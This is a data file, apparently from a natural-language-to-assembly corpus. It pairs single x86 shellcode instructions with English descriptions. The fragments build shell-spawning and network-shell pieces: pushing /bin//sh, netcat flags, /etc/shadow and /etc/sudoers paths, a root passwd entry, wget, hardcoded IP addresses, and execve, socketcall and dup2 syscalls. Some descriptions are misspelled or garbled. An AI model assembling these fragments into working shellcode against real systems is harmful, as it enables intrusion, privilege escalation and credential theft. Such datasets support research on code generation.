push 0x30317974	push 0x30317974 onto the stack
push 0x30317974	push the 0x30317974 onto the stack
push 0x31313131	push 0x31313131 onto the stack
push 0x3131313a	push 0x3131313a onto the stack
push 0x31373737	push 0x31373737 onto the stack
push 0x31373737	push the 0x31373737 onto the stack
push 0x3170762d	push 0x3170762d onto the stack
push 0x3170762d	push the value 0x3170762d to the stack
push 0x3170762d	push the 0x3170762d onto the stack
push 0x32322e32	push 0x32322e32 onto the stack
push 0x32322e32	push 0x32322e32 to the stack
push 0x3458652e	push 0x3458652e onto the stack
push 0x37333333 \n push 0x3170762d	push ‘-vp13337’ on stack
push 0x37373333	push 0x37373333 to the stack
push 0x37373333	push the 0x37373333 onto the stack
push 0x37373333	push 0x37373333 onto the stack
push 0x3a303a3a	push 0x3a303a3a onto the stack
push 0x3a303a3a \n push 0x74303072	push ‘r00t::0:’ on stack
push 0x3a30754a	push 0x3a30754a onto the stack
push 0x3a3a3a30 \n push esi	push :::0 and esi content on stack
push 0x3d4c4c41	push the value 0x3d4c4c41 onto the stack
push 0x3d4c4c41	push 0x3d4c4c41 onto the stack
push 0x3e0a7964	push 0x3e0a7964 onto the stack
push 0x3f	load __nr_dup2 into al register
push 0x3f \n pop eax	load __nr_dup2 into eax register
push 0x4	copy write syscall number in eax register
push 0x4	push the sizeof = 0x4 onto the stack
push 0x4	push 0x4 onto the stack
push 0x4	push the value 0x4 onto the stack
push 0x4 \n pop eax	copy write syscall number in eax register
push 0x4 \n pop eax	load write syscall number into eax register
push 0x4 \n pop eax \n add eax,0x2	load __nr_close into eax register
push 0x45683933	push 0x45683933 onto the stack
push 0x46	push 0x46 onto the stack
push 0x46 \n pop eax \n int 0x80	execute __nr_setreuid = 0x46 syscall
push 0x4c4c4128	push 0x4c4c4128 onto the stack
push 0x4c4c4128	push the value 0x4c4c4128 onto the stack
push 0x4c5a304b	push 0x4c5a304b onto the stack
push 0x4f4e2029	push the value 0x4f4e2029 onto the stack
push 0x4f4e2029	push 0x4f4e2029 onto the stack
push 0x5	push hexadecimal value 0x5 on stack
push 0x5	push 0x5 onto the stack
push 0x5	push the 0x5 onto the stack
push 0x5 \n pop eax	copy open syscall numebr into eax register
push 0x5 \n pop eax	load ope syscall number into eax register
push 0x50446862	push 0x50446862 onto the stack
push 0x53534150	push the 0x53534150 onto the stack
push 0x53534150	push 0x53534150 onto the stack
push 0x5f657a69	push ‘_ezi’ on stack
push 0x6	push ipproto_tcp value, 6, on stack
push 0x6	push protocol ipv6 value, 6, on stack
push 0x6	push 0x6 onto the stack
push 0x6	push the 0x6 value onto the stack
push 0x6 \n push 0x1 \n push 0x2	push hexadecimal values 0x6, 0x1 and 0x2 on stack
push 0x6 \n push 0x1 \n push 0xa	push the hexadecimal value 0x6, 0x1 and 0x10 on stack that represent respectively then args ipproto_tcp =6, the socket_type = sock_stream (0x1) and af_inet6= 10
push 0x61622f2f	push 0x61622f2f onto the stack
push 0x61622f6e	push 0x61622f6e onto the stack
push 0x61655220	push 0x61655220 onto the stack
push 0x6168732f	push 0x6168732f onto the stack
push 0x6168732f	push 0x6168732f to the stack
push 0x6168732f	push the value 0x6168732f onto the stack
push 0x6168732f \n push 0x6374652f	push ‘/etc/sha’ on stack
push 0x6168732f \n push 0x6374652f \n mov ebx, esp	push the value 0x6168732f and the value 0x6374652f onto the stack and point the ebx register to the stack register
push 0x61702f2f	push 0x61702f2f onto the stack
push 0x61702f2f \n push 0x13371337 \n push 0x64777373 \n push 0x6374652f	push ‘/etcsswd7.7.//pa’ on stack
push 0x61702f2f \n push 0x6374652f \n mov eax, esp	push the value 0x61702f2f and the value 0x6374652f onto the stack and point the eax register to the stack register
push 0x61702f2f \n push 0x6374652f \n mov ebx, esp	push the value 0x61702f2f and the value 0x6374652f onto the stack and point the ebx register to the stack register
push 0x61702f2f \n push 0x6374652f \n mov ecx, esp	push the value 0x61702f2f and the value 0x6374652f onto the stack and point the ecx register to the stack register
push 0x61702f2f \n push 0x6374652f \n mov edi, esp	push the value 0x61702f2f and the value 0x6374652f onto the stack and point the edi register to the stack register
push 0x61702f2f \n push 0x6374652f \n mov edx, esp	push the value 0x61702f2f and the value 0x6374652f onto the stack and point the edx register to the stack register
push 0x61702f2f \n push 0x6374652f \n mov esi, esp	push the value 0x61702f2f and the value 0x6374652f onto the stack and point the esi register to the stack register
push 0x61702f63	push the 0x61702f63 onto the stack
push 0x61702f63	push 0x61702f63 onto the stack
push 0x61722f6c	push ‘ar/l’ on satck
push 0x622f7273	push 0x622f7273 onto the stack
push 0x622f7273	push 0x622f7273 to the stack
push 0x636e2f2f	push 0x636e2f2f onto the stack
push 0x636e2f2f	push 0x636e2f2f to the stack
push 0x636e2f2f	push the 0x636e2f2f onto the stack
push 0x636e2f2f \n push 0x6e69622f	push ‘ /bin//cn’ on stack
push 0x636e2f2f \n push 0x6e69622f	push the string ‘/bin//cn’ on stack
push 0x6374652f	push 0x6374652f onto the stack
push 0x6374652f	push 0x6374652f to the stack
push 0x6374652f	push the 0x6374652f onto the stack
push 0x6374652f \n mov eax, esp	push the value 0x6374652f onto the stack and point eax to the stack register
push 0x6374652f \n mov ebp, esp	push the value 0x6374652f onto the stack and point ebp to the stack register
push 0x6374652f \n mov ebx, esp	push the value 0x6374652f onto the stack and point ebx to the stack register
push 0x6374652f \n mov ecx, esp	push the value 0x6374652f onto the stack and point ecx to the stack register
push 0x6374652f \n mov edi, esp	push the value 0x6374652f onto the stack and point edi to the stack register
push 0x6374652f \n mov edx, esp	push the value 0x6374652f onto the stack and point edx to the stack register
push 0x6374652f \n mov esi, esp	push the value 0x6374652f onto the stack and point esi to the stack register
push 0x64687373	push 0x64687373 onto the stack
push 0x64687373 \n mov eax, esp	push the value 0x64687373 onto the stack and point the eax register to the stack register
push 0x64687373 \n mov ebp, esp	push the value 0x64687373 onto the stack and point the ebp register to the stack register
push 0x64687373 \n mov ebx, esp	push the value 0x64687373 onto the stack and point the ebx register to the stack register
push 0x64687373 \n mov ecx, esp	push the value 0x64687373 onto the stack and point the ecx register to the stack register
push 0x64687373 \n mov edi, esp	push the value 0x64687373 onto the stack and point the edi register to the stack register
push 0x64687373 \n mov edx, esp	push the value 0x64687373 onto the stack and point the edx register to the stack register
push 0x64687373 \n mov esi, esp	push the value 0x64687373 onto the stack and point the esi register to the stack register
push 0x6475732f	push 0x6475732f onto the stack
push 0x6475732f	push 0x6475732f to the stack
push 0x6475732f	push the 0x6475732f onto the stack
push 0x6475732f \n push 0x6374652f \n mov eax, esp	push the value 0x6475732f and the value 0x6374652f onto the stack and point the eax register to the stack register
push 0x6475732f \n push 0x6374652f \n mov ebx, esp	push the value 0x6475732f and the value 0x6374652f onto the stack and point the ebx register to the stack register
push 0x6475732f \n push 0x6374652f \n mov ecx, esp	push the value 0x6475732f and the value 0x6374652f onto the stack and point the ecx register to the stack register
push 0x6475732f \n push 0x6374652f \n mov edi, esp	push the value 0x6475732f and the value 0x6374652f onto the stack and point the edi register to the stack register
push 0x6475732f \n push 0x6374652f \n mov edx, esp	push the value 0x6475732f and the value 0x6374652f onto the stack and point the edx register to the stack register
push 0x6475732f \n push 0x6374652f \n mov esi, esp	push the value 0x6475732f and the value 0x6374652f onto the stack and point the esi register to the stack register
push 0x64777373	push the 0x64777373 onto the stack
push 0x64777373	push 0x64777373 onto the stack
push 0x64777373 \n push 0x61702f63 \n push 0x74652f2f \n mov ebx, esp	push the path //etc/passwd on the stack and load stack pointer to ebx
push 0x64777373 \n push 0x61702f63 \n push 0x74652f2f \n xor ebx, ebp \n lea ebx, [esp]	push the path //etc/passwd on the stack and load stack pointer to ebx
push 0x65636170	push ‘ecap’ on stack
push 0x6567772f	push 0x6567772f onto the stack
push 0x6567772f	push 0x6567772f to the stack
push 0x656c6966	push 0x656c6966 onto the stack
push 0x656c6966	push the 0x656c6966 onto the stack
push 0x656e7265	push ‘enre’ label on stack
push 0x65726f43	push 0x65726f43 onto the stack
push 0x65782e2f	push 0x65782e2f onto the stack
push 0x65782e2f	push 0x65782e2f to the stack
push 0x65782e2f \n push 0x706d742f	push the name of file to be executed = ‘/tmp/.xe’
push 0x66	push 0x66 onto the stack
push 0x66	push 0x66 to the stack
push 0x66	push the 0x66 onto the stack
push 0x66 \n pop eax	load the socketcall number 102 on eax register
push 0x66 \n pop eax	load __nr_socketcall into eax register
push 0x66 \n pop eax	load __nr_socketcall syscall into al register
push 0x66 \n pop eax	load socketcall syscall into eax register
push 0x67513231	push 0x67513231 onto the stack
push 0x6769666e	push 0x6769666e onto the stack
push 0x682f2f2f	push 0x682f2f2f onto the stack
push 0x682f2f2f	push the 0x682f2f2f value onto the stack
push 0x68732f2f	push ascii sh// onto stack
push 0x68732f2f	push hs// string on stack
push 0x68732f2f	push ‘//sh’ on stack
push 0x68732f2f	push //sh to the stack
push 0x68732f2f	push hs//
push 0x68732f2f	push the 0x68732f2f value onto the stack
push 0x68732f2f	push the value 0x68732f2f onto the stack
push 0x68732f2f	push 0x68732f2f to the stack
push 0x68732f2f	push 0x68732f2f onto the stack
push 0x68732f2f \n push 0x68732f2f \n push 0x2f656c2d	push ‘ -le///sh//sh’ on stack
push 0x68732f2f \n push 0x6e69622f	push /bin//sh
push 0x68732f2f \n push 0x6e69622f	push ‘/bin//sh’ on stack
push 0x68732f2f \n push 0x6e69622f	push the string “/bin//sh” on stack
push 0x68732f2f \n push 0x6e69622f	push “/bin//sh” on stack
push 0x68732f2f \n push 0x6e69622f	push the string ‘ /bin//sh’ on stack
push 0x68732f2f \n push 0x6e69622f	push ‘/bin//sh’ string on stack
push 0x68732f2f \n push 0x6e69622f \n mov eax, esp	push /bin/sh onto the stack and point the eax register to the stack register
push 0x68732f2f \n push 0x6e69622f \n mov eax, esp	move /bin/sh into eax
push 0x68732f2f \n push 0x6e69622f \n mov eax, esp	put ASCII /bin/sh into eax
push 0x68732f2f \n push 0x6e69622f \n mov eax, esp	move /bin/sh into the eax register
push 0x68732f2f \n push 0x6e69622f \n mov ebx, esp	save /bin/sh in ebx register
push 0x68732f2f \n push 0x6e69622f \n mov ebx, esp	save /bin//sh in ebx register
push 0x68732f2f \n push 0x6e69622f \n mov ebx, esp	ebx points to /bin//sh
push 0x68732f2f \n push 0x6e69622f \n mov ebx, esp	push //bin/sh in ebx
push 0x68732f2f \n push 0x6e69622f \n mov ebx, esp	push /bin/sh/ in ebx register
push 0x68732f2f \n push 0x6e69622f \n mov ebx, esp	push ASCII /bin/sh onto the stack and point the ebx register to the stack register
push 0x68732f2f \n push 0x6e69622f \n mov ebx, esp	put /bin/sh into ebx
push 0x68732f2f \n push 0x6e69622f \n mov ebx, esp	move ASCII /bin/sh into ebx
push 0x68732f2f \n push 0x6e69622f \n mov ebx, esp	move /bin/sh into the ebx register
push 0x68732f2f \n push 0x6e69622f \n mov ebx,esp	load the string /bin//sh on ebx register
push 0x68732f2f \n push 0x6e69622f \n mov ebx,esp	make ebx pointing to the string “/bin//sh”
push 0x68732f2f \n push 0x6e69622f \n mov ebx,esp	load the string “/bin//sh” into ebx regsiter
push 0x68732f2f \n push 0x6e69622f \n mov ebx,esp	load ‘/bin//sh\0’ into ebx register
push 0x68732f2f \n push 0x6e69622f \n mov ecx, esp	move ASCII /bin/sh into ecx
push 0x68732f2f \n push 0x6e69622f \n mov ecx, esp	move /bin/sh into the ecx register
push 0x68732f2f \n push 0x6e69622f \n mov ecx, esp	push /bin/sh onto the stack and point the ecx register to the stack register
push 0x68732f2f \n push 0x6e69622f \n mov ecx, esp	put /bin/sh into ecx
push 0x68732f2f \n push 0x6e69622f \n mov edx, esp	push ASCII /bin/sh onto the stack and point the edx register to the stack register
push 0x68732f2f \n push 0x6e69622f \n mov edx, esp	put /bin/sh into edx
push 0x68732f2f \n push 0x6e69622f \n mov edx, esp	move ASCII /bin/sh into edx
push 0x68732f2f \n push 0x6e69622f \n mov edx, esp	move /bin/sh into the edx register
push 0x68732f2f \n push 0x6e69622f \n push 0x2f656c2d	push the string ‘-le//bin//sh’ on stack
push 0x68732f6e	push ‘hs/b’
push 0x68732f6e	push the 0x68732f6e onto the stack
push 0x68732f6e	push 0x68732f6e to the stack
push 0x68732f6e	push 0x68732f6e onto the stack
push 0x68732f6e \n push 0x69622f2f	push the string //bin/sh on the stack
push 0x68732f6e \n push 0x69622f2f \n mov ebx, esp	push the path //bin/sh in ebx register
push 0x68732f6e \n push 0x69622f2f \n mov ebx, esp	load the string //bin/sh on the register ebx
push 0x68735858	push the value 0x68735858 onto the stack
push 0x68736162	push 0x68736162 to the stack
push 0x68736162	push 0x68736162 onto the stack
push 0x68736162 \n push 0x2f6e6962 \n push 0x2f2f2f2f	push the string ‘////bin/bash’ on stack
push 0x68736162 \n push 0x2f6e6962 \n push 0x2f2f2f2f	push ‘////bin/bash’ into the stack
push 0x68736162 \n push 0x2f6e6962 \n push 0x2f2f2f2f	push the string ‘////bin/bash’ onto the stack
push 0x68736164	push 'hsad' on stack
push 0x68736164	push 0x68736164 to the stack
push 0x68736164	push 0x68736164 onto the stack
push 0x68736164 \n push 0x2f6e6962 \n push 0x2f2f2f2f	push (////bin/dash) into the stack
push 0x6873732f	push the value 0x6873732f onto the stack
push 0x6873732f \n push 0x6374652f \n mov eax, esp	push the value 0x6873732f and the value 0x6374652f onto the stack and point the eax register to the stack register
push 0x6873732f \n push 0x6374652f \n mov ebx, esp	push the value 0x6873732f and the value 0x6374652f onto the stack and point the ebx register to the stack register
push 0x6873732f \n push 0x6374652f \n mov ecx, esp	push the value 0x6873732f and the value 0x6374652f onto the stack and point the ecx register to the stack register
push 0x6873732f \n push 0x6374652f \n mov edi, esp	push the value 0x6873732f and the value 0x6374652f onto the stack and point the edi register to the stack register
push 0x6873732f \n push 0x6374652f \n mov edx, esp	push the value 0x6873732f and the value 0x6374652f onto the stack and point the edx register to the stack register
push 0x6873732f \n push 0x6374652f \n mov esi, esp	push the value 0x6873732f and the value 0x6374652f onto the stack and point the esi register to the stack register
push 0x68737a2f	push hsz/ on stack
push 0x68737a2f	push 0x68737a2f onto the stack
push 0x68737a2f \n push 0x6e69622f	push the string ‘/bin/zsh’ on stack
push 0x68909090 \n pop eax	load hexadecimal value 0x68909090 into eax
push 0x69616863	push the 0x69616863 onto the stack
push 0x69622f2f	push ‘ib//’
push 0x69622f2f	push the 0x69622f2f onto the stack
push 0x69622f2f	push 0x69622f2f to the stack
push 0x69622f2f	push 0x69622f2f onto the stack
push 0x69622f2f \n mov eax, esp	push the value 0x69622f2f onto the stack and point the eax register to the stack register
push 0x69622f2f \n mov ebx, esp	push the value 0x69622f2f onto the stack and point the ebx register to the stack register
push 0x69622f2f \n mov ecx, esp	push the value 0x69622f2f onto the stack and point the ecx register to the stack register
push 0x69622f2f \n mov edx, esp	push the value 0x69622f2f onto the stack and point the edx register to the stack register
push 0x69622f3a	push 0x69622f3a onto the stack
push 0x69622f65	push 0x69622f65 onto the stack
push 0x69622f65	push 0x69622f65 to the stack
push 0x69622f65	push the 0x69622f65 onto the stack
push 0x6962732f	push 0x6962732f onto the stack
push 0x6962732f	push the 0x6962732f onto the stack
push 0x6b2f7379	push ‘k/st’ label
push 0x6c626174	push 0x6c626174 onto the stack
push 0x6d6f632e \n push 0x656c676f \n push 0x6f672031 \n push 0x2e312e31 \n push 0x2e373231	push the address 127.1.1.1 google.com on stack
push 0x6d6f646e	push ‘modn’ on stack
push 0x6d722f2f	push the 0x6d722f2f onto the stack
push 0x6d726574	push 0x6d726574 onto the stack
push 0x6d726574	push 0x6d726574 to the stack
push 0x6e	push the 0x6e onto the stack
push 0x6e69622f	push ascii nib/ onto stack
push 0x6e69622f	push nib/ string on stack
push 0x6e69622f	push ‘/bin’ on stack
push 0x6e69622f	push nib/ on stack
push 0x6e69622f	push /bin to the stack
push 0x6e69622f	push 0x6e69622f onto the stack
push 0x6e69622f	push nib/
push 0x6e69622f	push the 0x6e69622f onto the stack
push 0x6e69622f	push the value 0x6e69622f onto the stack
push 0x6e69622f \n push 0x7273752f \n mov eax, esp	push the value 0x6e69622f and the value 0x7273752f onto the stack and point the eax register to the stack register
push 0x6e69622f \n push 0x7273752f \n mov ebx, esp	push the value 0x6e69622f and the value 0x7273752f onto the stack and point the ebx register to the stack register
push 0x6e69622f \n push 0x7273752f \n mov ecx, esp	push the value 0x6e69622f and the value 0x7273752f onto the stack and point the ecx register to the stack register
push 0x6e69622f \n push 0x7273752f \n mov edx, esp	push the value 0x6e69622f and the value 0x7273752f onto the stack and point the edx register to the stack register
push 0x6e776f64	push the 0x6e776f64 onto the stack
push 0x6e7a762d	push -vzn parameter on the stack
push 0x6e7a762d	push 0x6e7a762d onto the stack
push 0x6e7a762d \n mov ebp, esp	push the value 0x6e7a762d onto the stack and point the ebp register to the stack register
push 0x6e7a762d \n mov ebx, esp	push the value 0x6e7a762d onto the stack and point the ebx register to the stack register
push 0x6e7a762d \n mov edi, esp	push the value 0x6e7a762d onto the stack and point the edi register to the stack register
push 0x6e7a762d \n mov esi, esp	push the value 0x6e7a762d onto the stack and point the esi register to the stack register
push 0x6f635f64	push 0x6f635f64 onto the stack
push 0x6f723a30	push 0x6f723a30 onto the stack
push 0x7 \n mov edx, esp	push the value 0x7 onto the stack and point edx to the stack register
push 0x70692f6e	push 0x70692f6e onto the stack
push 0x70692f6e	push the 0x70692f6e onto the stack
push 0x706d742f	push 0x706d742f onto the stack
push 0x706d742f	push 0x706d742f to the stack
push 0x706d742f	push the 0x706d742f onto the stack
push 0x7268732f	push 0x7268732f onto the stack
push 0x72702f2f	push ‘rp//’ on stack
push 0x72706475	push 0x72706475 onto the stack
push 0x7273752f	push 0x7273752f onto the stack
push 0x7273752f	push 0x7273752f to the stack
push 0x732f636f	push ‘s/co’ on stack
push 0x735f6176	push ‘s_av’ on stack
push 0x7361702f	push 0x7361702f to the stack
push 0x7361702f	push 0x7361702f onto the stack
push 0x73644d24	push 0x73644d24 onto the stack
push 0x7369642d	push 0x7369642d to the stack
push 0x7369642d	push 0x7369642d onto the stack
push 0x7372656f	push the 0x7372656f onto the stack
push 0x7372656f	push 0x7372656f to the stack
push 0x7372656f	push 0x7372656f onto the stack
push 0x7372656f \n push 0x6475732f \n push 0x6374652f	push “/etc/sudoers” on stack
push 0x7372656f \n push 0x6475732f \n push 0x6374652f	push ‘/etc/sudoers’ into stack
push 0x7374736f	push 0x7374736f onto the stack
push 0x7374736f	push the 0x7374736f onto the stack
push 0x7374736f \n push 0x682f6374 \n push 0x652f2f2f	push the string ///etc/hosts on stack
push 0x74	push 0x74 onto the stack
push 0x74	push 0x74 to the stack
push 0x74 \n push 0x6567772f \n push 0x6e69622f \n push 0x7273752f \n mov ebx,esp	load the string /usr/bin/wget in ebx regsiter
push 0x742f2f2f	push 0x742f2f2f onto the stack
push 0x742f2f2f	push the 0x742f2f2f onto the stack
push 0x742f3a31	push 0x742f3a31 onto the stack
push 0x74303072	push 0x74303072 onto the stack
push 0x7461632f \n push 0x6e69622f \n mov eax, esp	push the value 0x7461632f and the value 0x6e69622f onto the stack and point the eax register to the stack register
push 0x7461632f \n push 0x6e69622f \n mov ebx, esp	push the value 0x7461632f and the value 0x6e69622f onto the stack and point the ebx register to the stack register
push 0x7461632f \n push 0x6e69622f \n mov ecx, esp	push the value 0x7461632f and the value 0x6e69622f onto the stack and point the ecx register to the stack register
push 0x7461632f \n push 0x6e69622f \n mov edi, esp	push the value 0x7461632f and the value 0x6e69622f onto the stack and point the edi register to the stack register
push 0x7461632f \n push 0x6e69622f \n mov edx, esp	push the value 0x7461632f and the value 0x6e69622f onto the stack and point the edx register to the stack register
push 0x7461632f \n push 0x6e69622f \n mov esi, esp	push the value 0x7461632f and the value 0x6e69622f onto the stack and point the esi register to the stack register
push 0x74652f2f	push the 0x74652f2f onto the stack
push 0x74652f2f	push 0x74652f2f onto the stack
push 0x746f6f72	push 0x746f6f72 onto the stack
push 0x74756873	push the 0x74756873 onto the stack
push 0x74756f2f	push 0x74756f2f onto the stack
push 0x74756f2f	push the 0x74756f2f onto the stack
push 0x752f2f2f	push 0x752f2f2f onto the stack
push 0x752f2f2f	push 0x752f2f2f to the stack
push 0x7665642f	push 0x7665642f onto the stack
push 0x7665642f	push the 0x7665642f onto the stack
push 0x76766c2d	push 0x76766c2d onto the stack
push 0x76766c2d	push 0x76766c2d to the stack
push 0x76766c2d	push the 0x76766c2d onto the stack
push 0x776f6461 \n push 0x68732f63 \n push 0x74652f2f	push the string ‘//etc/shadow’ on stack
push 0x776f6461 \n push 0x6873672f \n push 0x6374652f \n mov ebx, esp	load the string ‘/etc/gshadow’ into ebx regsiter
push 0x776f6490 \n pop ebx	load hexadecimal value 0x776f6490 into ebx register
push 0x78	push 0x78 onto the stack
push 0x78	push 0x78 to the stack
push 0x78	push the 0x78 onto the stack
push 0x78 \n mov ebx, esp	move the character x in ebx register
push 0x782f2f32	push 0x782f2f32 onto the stack
push 0x782f2f32	push 0x782f2f32 to the stack
push 0x782f6e69	push 0x782f6e69 onto the stack
push 0x782f6e69	push 0x782f6e69 to the stack
push 0x78534a52	push 0x78534a52 onto the stack
push 0x79616c70	push 0x79616c70 to the stack
push 0x79616c70	push 0x79616c70 onto the stack
push 0x8	push 0x8 onto the stack
push 0x81e3a8c0	push inet_addr 192.168.227.129 (hex)
push 0x81e3a8c0	push 0x81e3a8c0 onto the stack
push 0x8501a8c0	push ip address 192.168.1.133 (hex)
push 0x8501a8c0	push 0x8501a8c0 onto the stack
push 0xa	push af_inet6 value, 10, on stack
push 0xa	push af_inet6 = 10 on stack
push 0xa	push 0xa onto the stack
push 0xa	push 0xa to the stack
push 0xa01a8c0	push the 0xa01a8c0 onto the stack
push 0xb	push 0xb to the stack
push 0xb	push 0xb onto the stack
push 0xb \n pop eax	load execve in eax
push 0xb \n pop eax	load __nr_execve into eax register
push 0xb \n pop eax	load __nr_execve syscall into eax register
push 0xb \n pop eax	load execve syscall number into eax register
push 0xb \n pop eax	load execve syscall number into eax reegisster
push 0xb \n pop eax	load execve syscall into eax register
push 0xb pop eax	push the hexadecimal value 0xb on the stack and put it in eax register taking it from the stack
push 0xc \n pop eax \n pop edx	load hexadecimal value into eax and edx content
push 0xdebf	push 0xdebf value to the stack
push 0xefffff7f	push ip address 127.255.255.254 on stack
push 0xefffff7f	push 0xefffff7f onto the stack
push 0xf	push 0xf onto the stack
push 0xf \n pop eax	load chmod syscall number into eax register
push 0xf \n pop eax	load chmod syscall into eax
push 0xf \n pop eax	load chmod syscall into eax register
push 0xffffff90 \n pop ebx	push hexadecimal value 0xffffff90 into ebx register
push 0xfffffffa	push hexadecimal value 0xfffffffa on stack
push 1	push 1 to the stack
push 1	push 1 onto the stack
push 10	push 10 onto the stack
push 10 \n mov eax, esp	push the value 10 onto the stack and point eax to the stack register
push 102	push syscall for socketcall() 102
push 102	push 102 onto the stack
push 12 \n mov ebx, esp	push the value 12 onto the stack and point ebx to the stack register
push 15 \n mov ecx, esp	push the value 15 onto the stack and point ecx to the stack register
push 16	push 16 onto the stack (addrlen = 16)
push 16	push the size of strcut sockaddr_in
push 16	push 16 onto the stack
push 2	push 2 onto stack (af_inet = 2)
push 2	push 2 onto the stack
push 20	push 20 onto the stack
push 20	push the 20 onto the stack
push 216	push 216 value to the stack
push 6	push 6 onto the stack
push 6 \n push 1 \n push 10	push the values 6, 1 and 10 on stack
push ax	push ax onto the stack
push ax	push ax to the stack
push ax	push the ax onto the stack
push bx	push bx on the stack
push bx	push bx content on the stack
push bx	push bx onto the stack
push bx	push bx to the stack
push bx	push the contents of the bx register onto the stack
push byte -1	push the byte -1 onto the stack
push byte +0x1	push the byte +0x1 onto the stack
push byte +0x10	push the byte +0x10 onto the stack
push byte +0x2	push the byte +0x2 onto the stack
push byte +0x3	push the byte +0x3 onto the stack
push byte +0x46	push the byte +0x46 onto the stack
push byte +0x6	push the byte +0x6 onto the stack
push byte +0x66	push the byte +0x66 onto the stack
push byte +0x68	push byte +0x68 on stack
push byte +0x7f	push the byte +0x7f onto the stack
push byte +0x8	push the byte +0x8 onto the stack
push byte +0xb	push the byte +0xb onto the stack
push byte +0xb \n pop eax	load 11 into eax regsiter
push byte 0	push byte 0 onto stack
push byte 0x0	push the byte 0x0 onto the stack
push byte 0x01	push the byte 0x01 onto the stack
push byte 0x01	push the byte 0x01 to the stack
push byte 0x01 \n pop eax	put the syscall 0x01 into the eax register
push byte 0x02	push 02 onto the stack (af_inet = 2)
push byte 0x02	push the byte 0x02 onto the stack
push byte 0x02	push the byte 0x02 to the stack
push byte 0x02 \n pop eax	put the syscall 0x02 into the eax register
push byte 0x04	push the byte 0x04 onto the stack
push byte 0x04 \n pop eax	put the syscall 0x04 into the eax register
push byte 0x05	push the byte 0x05 onto the stack
push byte 0x05 \n pop eax	put the syscall 0x05 into the eax register
push byte 0x06	push the byte 0x06 onto the stack
push byte 0x06 \n pop eax	put the syscall 0x06 into the eax register
push byte 0x0b	push the byte 0x0b onto the stack
push byte 0x0b \n pop eax	load execve syscall number into eax register
push byte 0x0b \n pop eax	put the syscall 0x0b into the eax register
push byte 0x1	push the byte 0x1 to the stack
push byte 0x1	push the byte 0x1 onto the stack
push byte 0x1 \n mov ecx, esp	push the byte 0x1 onto the stack and point ecx to the stack register
push byte 0x1 \n pop ebx \n push byte ebx	load the byte sock_stream = 1 into ebx register then push ebx content on stack
push byte 0x1 \n pop edx	load the byte 0x1 into edx register
push byte 0x1 \n pop esi	load byte 0x1 into esi
push byte 0x1 \n push byte 0x2	push socket parameters sock_stream = 1 and af_inet = 2 on stack
push byte 0x10	push the byte 0x10 on stack
push byte 0x10	push the byte 0x10 onto the stack
push byte 0x10 \n pop eax	put the syscall 0x10 into the eax register
push byte 0x10 \n push ecx \n push esi \n mov ecx, esp	save 16, ecx contents and the saved socket descriptor (in esi) on ecx
push byte 0x11 \n mov ebx, esp	push the byte 0x11 onto the stack and point ebx to the stack register
push byte 0x17	push the byte 0x17 onto the stack
push byte 0x17 \n pop eax	put the syscall 0x17 into the eax register
push byte 0x1c	push the size of sockaddr_in6 = 28 on stac
push byte 0x1c	push the hexadecimal byte value 0x1c that is the size of sockaddr_in6
push byte 0x1c	push the byte 0x1c onto the stack
push byte 0x1c \n pop eax	put the syscall 0x1c into the eax register
push byte 0x1f	push the byte 0x1f onto the stack
push byte 0x1f \n pop eax	put the syscall 0x1f into the eax register
push byte 0x2	define the queueliit = 2 and push it on stack
push byte 0x2	push the hexadecimal value 0x2 on stack
push byte 0x2	push af_inet = 2 on stack
push byte 0x2	push the byte 0x2 onto the stack
push byte 0x2	push the byte 0x2 to the stack
push byte 0x2 \n mov ecx, esp	push the byte 0x2 onto the stack and point ecx to the stack register
push byte 0x2 \n pop eax	put the syscall 0x2 into the eax register
push byte 0x2 \n pop ecx	load the hexadecimal value 0x2 into ecx register
push byte 0x2 \n push esi	push byte 0x2 adn esi content on stack
push byte 0x2e	push the byte 0x2e onto the stack
push byte 0x2e \n pop eax	put the syscall 0x2e into the eax register
push byte 0x2f	push the byte 0x2f onto the stack
push byte 0x2f \n pop eax	put the syscall 0x2f into the eax register
push byte 0x3	push the byte 0x3 onto the stack
push byte 0x3 \n pop eax	put the syscall 0x3 into the eax register
push byte 0x3 \n pop esi	load byte 3 into esi register
push byte 0x30	push hexadecimal value 0x30 as a byte on stack
push byte 0x30	push the byte 0x30 onto the stack
push byte 0x30 \n pop eax	put the syscall 0x30 into the eax register
push byte 0x3f	push the byte 0x3f onto the stack
push byte 0x3f \n pop eax	load dup2 syscall numbere into eax register
push byte 0x3f \n pop eax	put the syscall 0x3f into the eax register
push byte 0x4	push the byte 0x4 onto the stack
push byte 0x4 \n pop eax	put the syscall 0x4 into the eax register
push byte 0x4 \n pop eax \n inc eax	load __nr_open syscall into eax register
push byte 0x43	syscall for sigaction()
push byte 0x43	make the system call sigaction
push byte 0x43	sigaction
push byte 0x43	syscall for sigaction
push byte 0x43	system call sigaction
push byte 0x43 \n pop eax	put syscall sigaction into the eax register
push byte 0x43 \n pop eax	put the syscall 0x43 into the eax register
push byte 0x5 \n mov ebx, esp	push the byte 0x5 onto the stack and point ebx to the stack register
push byte 0x5 \n mov edx, esp	push the byte 0x5 onto the stack and point edx to the stack register
push byte 0x64	push the byte 0x64 to the stack
push byte 0x64	push the byte 0x64 onto the stack
push byte 0x64 \n pop eax	put the syscall 0x64 into the eax register
push byte 0x64 \n push word 0x7773 \n push word 0x7773 \n push 0x7361702f \n push 0x6374652f \n mov ebx, esp	load the string /etc/passwd in abx register
push byte 0x66	push the byte 0x66 onto the stack
push byte 0x66 \n pop eax	move the command socketcall = 102 in al register
push byte 0x66 \n pop eax	move the command socketcall = 102 into eax register
push byte 0x66 \n pop eax	load socketcall syscall number into eax regsiter
push byte 0x66 \n pop eax	put the syscall 0x66 into the eax register
push byte 0x7 \n mov edx, esp	push the byte 0x7 onto the stack and point edx to the stack register
push byte 0x77	push the byte 0x77 to the stack
push byte 0x77	push the byte 0x77 onto the stack
push byte 0x77 \n pop eax	put the syscall 0x77 into the eax register
push byte 0x77 \n push word 0x6f64 \n push 0x6168732f \n push 0x6374652f \n mov ebx, esp	load the string /etc/shadow in ebx register
push byte 0x8 \n mov edx, esp	push the byte 0x8 onto the stack and point edx to the stack register
push byte 0xb	push the byte 0xb onto the stack
push byte 0xb \n pop eax	load execve syscall into eax register
push byte 0xb \n pop eax	put the syscall 0xb into the eax register
push byte 0xc	push the byte 0xc onto the stack
push byte 0xc \n pop eax	put the syscall 0xc into the eax register
push byte 0xc \n pop eax \n dec eax	load execve syscall into eax register
push byte 1	move byte 1 onto stack
push byte 1	push byte 1 onto the stack
push byte 1	push the byte 1 to the stack
push byte 1	push the byte 1 onto the stack
